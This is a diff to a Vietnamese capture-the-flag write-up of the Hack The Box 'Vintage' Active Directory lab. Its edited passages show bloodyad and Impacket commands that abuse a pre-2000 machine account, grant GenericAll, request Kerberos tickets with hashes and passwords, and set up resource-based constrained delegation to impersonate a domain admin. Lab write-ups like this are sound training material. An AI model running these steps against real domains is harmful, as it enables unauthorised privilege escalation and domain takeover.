@@ -17,7 +17,7 @@ attack_path:
     edge: genericAll
   - node: svc_sql
     type: user
-    edge: password reuse
+    edge: Password Reuse
   - node: c.neri
     type: user
     edge: DPAPI
@@ -120,6 +120,8 @@ LDAP        DC01            389    DC01             gMSA01$
 LDAP        DC01            389    DC01             FS01$
 ```
 
+## 2. Tài khoản máy pre2k
+
 Nhiều khả năng FS01$ là tài khoản pre2k nên mình thử dùng module pre2k của NetExec, không hiểu sao nó không hốt được `FS01$` nhưng thử tay thì lại được.
 
 
@@ -170,9 +172,7 @@ Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies
   bloodyad -k -d vintage.htb -H DC01.vintage.htb add groupMember SERVICEMANAGERS 'gmsa01$'
 [+] gmsa01$ added to SERVICEMANAGERS
 ```
-
-Thêm genericAll và đổi mật khẩu `svc_sql`
-
+Thêm genericAll lên `svc_sql`:
 
 ```
   getTGT.py 'vintage.htb/gmsa01$:fs01' -hashes :f44e1eceaa7a24c32e8a54d62d032f96
@@ -181,8 +181,6 @@ Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies
 [*] Saving ticket in gmsa01$.ccache
   bloodyad -k -d vintage.htb -H DC01.vintage.htb add genericAll svc_sql 'gmsa01$'
 [+] gmsa01$ has now GenericAll on svc_sql
-  bloodyad -k -d vintage.htb -H DC01.vintage.htb set password svc_sql Password123
-[+] Password changed successfully!
 ```
 
 > Phải reset ccache để Kerberos cập nhật token chứa đặc quyền mới.
@@ -408,13 +406,19 @@ Unknown     : Uncr4ck4bl3P4ssW0rd0312
 
 Khác với constrained delegation cổ điển (cấu hình nằm trên tài khoản đi mạo danh), RBCD đặt cấu hình trên tài khoản bị mạo danh - ở đây là DC. Ta đưa `FS01$` vào `DELEGATEDADMINS`, rồi dùng S4U2self + S4U2proxy để tự cấp một vé `cifs/DC01` mạo danh một domain admin (`l.bianchi_adm`):
 
+> Ta cũng có thể dùng `c.neri_adm` để mạo danh luôn gọi là SPN-less RBCD nhưng nó loằng ngoằng hơn là dùng tài khoản máy tính.
+
 ![](/assets/img/htb-vintage/bloodhound-3.png)
 
-> Mạo danh một tài khoản admin không có sẵn như `l.bianchi` thường có xác suất thành công cao hơn `Administrator` vì `Administrator` mặc định mang cờ `NOT_DELEGATED` trong UAC.
+> Mạo danh một tài khoản admin không có sẵn như `l.bianchi_adm` thường có xác suất thành công cao hơn `Administrator` vì `Administrator` mặc định mang cờ `NOT_DELEGATED` trong UAC.
 
 Thêm `FS01$` vào nhóm:
 
-```
+```fish
+  getTGT.py vintage.htb/c.neri_adm:Uncr4ck4bl3P4ssW0rd0312
+Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Saving ticket in c.neri_adm.ccache
   export KRB5CCNAME=c.neri_adm.ccache
   bloodyad -k -d vintage.htb -H DC01.vintage.htb add groupMember DELEGATEDADMINS 'fs01$'
 [+] fs01$ added to DELEGATEDADMINS
